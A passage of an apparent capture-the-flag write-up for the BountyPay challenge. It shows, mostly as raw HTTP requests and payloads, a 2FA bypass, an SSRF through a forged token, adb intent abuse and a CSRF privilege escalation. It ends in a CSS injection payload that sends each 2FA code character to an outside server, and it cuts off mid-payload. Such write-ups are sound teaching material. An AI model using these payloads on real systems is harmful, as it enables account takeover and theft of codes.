The latter one could be found in one of the Base64 decoded string:
- `bD83Jk27dQ`

But how can I find the correct challenge?

First of all, I noticed that the *challenge* was likely to be an MD5 hash.
{F853860}

So I tried the most obious thing: "What if the *challenge* value (**5828c689761cce705a1c84d9b1a1ed5e**) is nothing more than the MD5 of the *challenge_answer* (**bD83Jk27dQ**)?"

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 100
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```

Whoaaaa, that's right! We are logged in as Brian Oliver!
{F853862}

Actually, what I then found out is that no matter which *challenge_answer* you insert, it is just enough that the *challenge* is the MD5 of that, and this will be useful later.

## SSRF to Android APK
Ok so, what can we do as Brian Oliver?
Not so much apparently as all the transactions seem to be empty :(

At this point I took a look at my Burp History and noticed that after login the server set for us what appears to be a JWT Token `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` that when Base64 decoded resulted to be like this:
- `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`

So there is an accountID and a hash.
Let's search these values in our Burp History to check if they were maybe already appeared somewhere else.

Mmm...that's interesting. The *account_id* value is present in the response to the following GET request related to the loading of specific transactions like https://app.bountypay.h1ctf.com/statements?month=01&year=2020:
{F853868}

However, by directly trying to request the API https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020 we receive an error: *["Missing or invalid Token"]*.
So, it appears that in order to use APIs we have to first obtain a valid token, so that's not the way for now.

So, after brainstorming a series of "What if?" (that's the job of an hacker, after all :D ) I thought:
- "What if I try to manipulate the accountID and see what happens?"

So, for example, by modifying the *account_id* to *test*:
```
GET /statements?month=03&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoidGVzdCIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```
We can see that the *account_id* value is used to construct the related API URL.
```
{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/test\/statements?month=03&year=2020","data":"[\"Invalid Account ID\"]"}
```

At this point we could request any path on the api.bountypay.h1ctf.com domain...and what we have on that? Ah sure, the possible SSRF! 

So combining all the previous ideas I obtained the following JWT Token:
- `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tLyMvIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=`

That is:

- 
`{"account_id":"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/#/","hash":"de235bffd23df6995ad4e0930baac1a2"}
`

Indeed, this seems to be successful as it returns what it seems a login form:
```
{
    "url": "https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/\/statements?month=03&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"
}
```

However...we don't have any new credentials to use!

### BurpSuite-Fu
So at this point I tried to find if there are some hidden directories or files only accessible through SSRF (as the ffuf done before resulted in an error as my IP was not in whitelist).

I did this through the use of some slightly unknown Burp Intruder options.

My basic setup was the following:
{F854063}

The wordlist I used is the *common.txt* from SecLists (https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt).

Then the trick I used was to set 3 *Payload Processing* steps:
1. Set a "prefix" as `{"account_id":"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/`
2. Set a "suffix" as `/#/","hash":"de235bffd23df6995ad4e0930baac1a2"}`
3. Apply Base64 Encoding to all of this

{F854067}

This basically automates the search while also applying the right encoding.

This way I quickly find that a correct *token* value is this:
```
eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tL3VwbG9hZHMvIy8iLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==
```
which represents
```
{"account_id":"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/uploads/#/","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

At the *uploads* path there was a Directory Listing where it was clear that an APK could be downloaded.

```
{
    "url": "https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads\/#\/\/statements?month=03&year=2020",
    "data": "<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"
}
```

Bingo!
So let's download that! 

## Solving all the Android flags
So, I downloaded the APK from the following URL:
- https://software.bountypay.h1ctf.com/uploads/BountyPay.apk

Note that for solving all the expected flags, I used an old Nexus that I purchased years ago, but you could have also used an emulator like Genymotion.

Also, for obtain the source code of an Android application, starting from the APK, I usually use **Jadx** (https://github.com/skylot/jadx) as it is really good for the purpose.

My approach to these series of challenges was the following:
1. Load the activity on my Android device
2. Check the related code on Jadx

So...let's start!


### MainActivity

This is actually loaded at first start of the application and it is used just to create a username and a Twitter handler. Nothing to see here.

### PartOneActivity
This is just a blank activity (like all the following ones).
And this is the related code retrieved.
{F854087}

As my objective was to call the *logFlagFound()* method, I needed to find a way to make *true* this statement:
```
if (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")) {
```

It is easy to see that this involves using an *Intent* and sending specific *Intent data* following the requirements specified.

So I solved this first step by using **adb** to send an Intent to this Activity (make sure to run *adb devices* first to check if the real or virtual device is correctly recognized):
```
adb shell am start -a android.intent.action.VIEW -d "?start=PartTwoActivity" bounty.pay/bounty.pay.PartOneActivity
```

### PartTwoActivity
This was similar to the previous one but involved two different steps:
1. Make visible all the elements of the Activity
2. Send specific Intent Data like before

So, I solved the first step with:
```
adb shell am start -a android.intent.action.VIEW -d "?two=light\&switch=on" bounty.pay/bounty.pay.PartTwoActivity
```

And the second one by submitting `X-Token` in the text label.
Indeed, the hash displayed is a MD5 represting the word *Token* that must be concatenated with *X-*:

{F854101}

```
if (str.equals("X-" + ((String) dataSnapshot.getValue()))) {
```

The real issue with this step was that I didn't remember that I had to use *\* to escape the *&* character.


### PartThreeActivity

This involved again two steps:
1. Make visible all the elements of the Activity
2. Retrieve the X-Token value that is going to be useful later

I solved the first step with this command:
```
adb shell am start -a android.intent.action.VIEW -d "?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" bounty.pay/bounty.pay.PartThreeActivity
```

And then I found the Leaked Hash saved in _/data/data/bounty.pay/shared_prefs/user_created.xml_:
```
 <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
```

Note that this was the expected solution if you have a rooted Android device.
Otherwise you could find the same information in logs through `adb logcat`:
{F854103}

So by inserting this value in the text label I finally solved all the Android challenges!

Wooooooow!

And to celebrate I tweeted this:

{F854107}

So, thanks again B3nac!

## Logging to staff as Sandra
So...back to web stuff!

The last Android activity said that some information achieved there could be useful for next challenges.
So at this point it was clear (having also solved all the Adam challenges...) that we were talking about the *X-Token* header:
- `X-Token: 8e9998ee3137ca9ade8f372739f062c1`

Where could I use that?

Well, during recon I found that https://api.bountypay.h1ctf.com/api/staff API endpoint was missing the right token, so that seemed to me the best idea.
So I tried the following GET request that returned some interesting results:
```
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://api.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

```
[{
    "name": "Sam Jenkins",
    "staff_id": "STF:84DJKEIP38"
}, {
    "name": "Brian Oliver",
    "staff_id": "STF:KE624RQ2T9"
}]
```

Two **staff_id**!

So I quickly tried something like that to use both these values:
`https://api.bountypay.h1ctf.com/api/staff?staff_id=STF:84DJKEIP38`

Mmm...same answer.
But what about a POST request?

`["Staff Member already has an account"]`

That's interesting! Unfortunately also the other staff_id returned nothing useful so honestly at this point I was stuck.

Then the following hint tweet came:
{F856245}

So let's look at this Twitter account!

Basically after some simple searches on that I found in the **Following** the account of Sandra (@SandraA76708114) that contained a photo with a new different *staff_id*...exactly what I was searching!
{F856255}

So, now trying the following request:
```
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://api.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```

We found **Sandra credentials**!
```
{
    "description": "Staff Member Account Created",
    "username": "sandra.allison",
    "password": "s%3D8qB8zEpMnc*xsz7Yp5"
}
```

As this was realted to staff, I tried to use these credentials on https://staff.bountypay.h1ctf.com/?template=login and finally reached to be logged in as Sandra.
{F856259}


## Privilege Escalation from Sandra to Marten
So in my head now the plan was to escalate from Sandra to Marten and then make the May bounty payment.
At first I thought this could be done in just one step but I was wrong :)

So...how can I escalate my privilege from a simple member of staff to a CEO?

By looking at the application I found this especially interesting JavaScript file at https://staff.bountypay.h1ctf.com/js/website.js:
```
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

That *upgradeToAdmin* surely seemed my target.

This was when collaboration really started but I dedicate a later chapter to that.

So, by taking a brief revision of my jQuery knowledge, this syntax:
```
$(".upgradeToAdmin").click(function()
```
Means that the function I am interested in is triggered once one (or more) element with HTML attribute *class="upgradeToAdmin"* is clicked.

This is the way how it also works the *Send Report* functionality:
```
$(".sendReport").click(function() {
```
Indeed, the API call is made once clicked on an element, in this case a button, which hash the HTML attribute *class="sendReport"*
{F856318}

However, as in this case there was no element with class "upgradeToAdmin", I considered I had to create that by myself.

Then I found other two important points:
1. The related API call */admin/upgrade?username=* must be done as an Admin
2. We have to pass also the username of the user we want to upgrade

For solving the first point I tried to find a feature that could have been reviewed also by an Admin.
The *Send Report* function seemed to be the most likely to try.

For solving the second point I searched for an input element with a name attribute equals to *username* and I found it on the login form (https://staff.bountypay.h1ctf.com/?template=login&username=sandra.allison):
```
let t = $('input[name="username"]').val();
```
{F856329}

So, at this point I had to find a way to create an element with *class="upgradeToAdmin"*.

Thus I found that I could edit the class attribute of the profile avatar through the following POST request in the *profile_avatar* body parameter:
```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Content-Length: 42
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://staff.bountypay.h1ctf.com/?template=home
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH

profile_name=sandra&profile_avatar=upgradeToAdmin
```

The new class could be retrieved when looking at Sandra avatar in the "Support Tickets" section at https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582:
{F856347}

Now I had to connect the dots and found a way to have both reachable at the same time the *login* template and the *ticket* one.

At first I tried something like this but nothing happened:
`https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582&template=login&username=sandra.allison`

Then, after countless attempts, I found that I could use **multi array** for having both two templates at the same time!
`https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison`

{F856350}

So now I had to find a way to make sure that the admin will click on the correct element and trigger the request.
For doing this we can leverage this piece of code belonging to the same JavaScript seen before:
```
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

Basically we can add a new "class" *tab1* that would be clicked if the related *#tab1* hash is present in the URL thus triggering also the click on *upgradeToAdmin*.

So I changed again my avatar:
```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Content-Length: 54
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://staff.bountypay.h1ctf.com/?template=home
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRC8rV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHb2lxaC9mWlFkZmNpdWZDVmJVNnNLOHFLT0svRkJSY0MwNTcyMEs4c1lyUzE3UT09

profile_name=sandra&profile_avatar=tab1 upgradeToAdmin
```

And now by requesting this:
`https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab1`

We see that the request that I want was effectively executed although with a 401 status code in response. But that's ok as I already know how to bypass that!
{F856389}

So at this point I just simply reported this page, including also the *#tab1* in the Base64:
`https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjE=`

Then when I reloaded the homepage I could see that a new *Admin tab* was added...yeah!!!

{F856399}


## Paying the May Bounty

From the *Admin* tab I could find Marten's credentials and I thought that was the end...how silly I was! :D

{F856409}

So I tried to first insert these credentials in staff.bountypay.h1ctf.com and then I tried in app.bountypay.h1ctf.com and finally they worked.
At this point then I bypassed the 2FA challenge just by using an arbitrary *challenge_answer* and the related MD5 for the *challenge*:
```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 123
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=marten.mickos&password=h%26H5wy2Lggj*kKn4OD%26Ype&challenge=098f6bcd4621d373cade4e832627b4f6&challenge_answer=test
```

So at this point I rushed to loading the May transactions:
{F856420}

Then I clicked on pay and...damn! Another **2FA** challenge and we have just 2 minutes to insert the right code! I am starting to hate them :D

{F856421}

The "Send challenge" request was the following:
```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

And it seemed to load a CSS (https://www.bountypay.h1ctf.com/css/uni_2fa_style.css) that is used in the first screen:
```
<input type="hidden" name="app_style" value="https://www.bountypay.h1ctf.com/css/uni_2fa_style.css">
```

Honestly I didn't really know what to think other than I would have likely try to load a CSS file that would try to exfiltrate the right code in less than 2 minutes!
That's when collaboration was on the rescue again to help me create a valid CSS for the purpose.

Also, while searching for CSS exfiltration on Google I found this great article by @d0nut which was very helpful:
- `https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b`

For now I knew that the code was of **length 7**.
{F856481}

And that I had to know which was the valid code value (the right one was **code_1**, **code_2**, etc).

So at the end I used this CSS file and loaded that on my web server then passing that URL to the previous request.

In case the code character was valid I would see on my logs which was that character and at which position must be inserted. 
Maybe this was not so elegant...but it worked!

```
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FF66FF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
input[value=A]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=A"); }
input[value=B]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=B"); }
input[value=C]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=C"); }
input[value=D]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=D"); }
input[value=E]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=E"); }
input[value=F]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=F"); }
input[value=G]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=G"); }
input[value=H]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=H"); }
input[value=I]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=I"); }
input[value=J]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=J"); }
input[value=K]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=K"); }
input[value=L]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=L"); }
input[value=M]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=M"); }
input[value=N]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=N"); }
input[value=O]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=O"); }
input[value=P]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=P"); }
input[value=Q]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=Q"); }
input[value=R]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=R"); }
input[value=S]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=S"); }
input[value=T]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=T"); }
input[value=U]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=U"); }
input[value=V]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=V"); }
input[value=W]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=W"); }
input[value=X]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=X"); }
input[value=Y]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=Y"); }
input[value=Z]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=Z"); }
input[value=a]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=a"); }
input[value=b]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=b"); }
input[value=c]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=c"); }
input[value=d]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=d"); }
input[value=e]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=e"); }
input[value=f]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=f"); }
input[value=g]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=g"); }
input[value=h]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=h"); }
input[value=i]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=i"); }
input[value=j]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=j"); }
input[value=k]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=k"); }
input[value=l]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=l"); }
input[value=m]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=m"); }
input[value=n]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=n"); }
input[value=o]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=o"); }
input[value=p]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=p"); }
input[value=q]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=q"); }
input[value=r]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=r"); }
input[value=s]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=s"); }
input[value=t]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=t"); }
input[value=u]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=u"); }
input[value=v]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=v"); }
input[value=w]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=w"); }
input[value=x]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=x"); }
input[value=y]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=y"); }
input[value=z]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=z"); }
input[value=0]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=0"); }
input[value=1]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=1"); }
input[value=2]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=2"); }
input[value=3]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=3"); }
input[value=4]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=4"); }
input[value=5]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=5"); }
input[value=6]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=6"); }
input[value=7]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=7"); }
input[value=8]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=8"); }
input[value=9]:nth-of-type(1) { background-image: url("https://mywebserver.com/data?1=9"); }

input[value=A]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=A"); }
input[value=B]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=B"); }
input[value=C]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=C"); }
input[value=D]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=D"); }
input[value=E]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=E"); }
input[value=F]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=F"); }
input[value=G]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=G"); }
input[value=H]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=H"); }
input[value=I]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=I"); }
input[value=J]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=J"); }
input[value=K]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=K"); }
input[value=L]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=L"); }
input[value=M]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=M"); }
input[value=N]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=N"); }
input[value=O]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=O"); }
input[value=P]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=P"); }
input[value=Q]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=Q"); }
input[value=R]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=R"); }
input[value=S]:nth-of-type(2) { background-image: url("https://mywebserver.com/data?2=S"); }
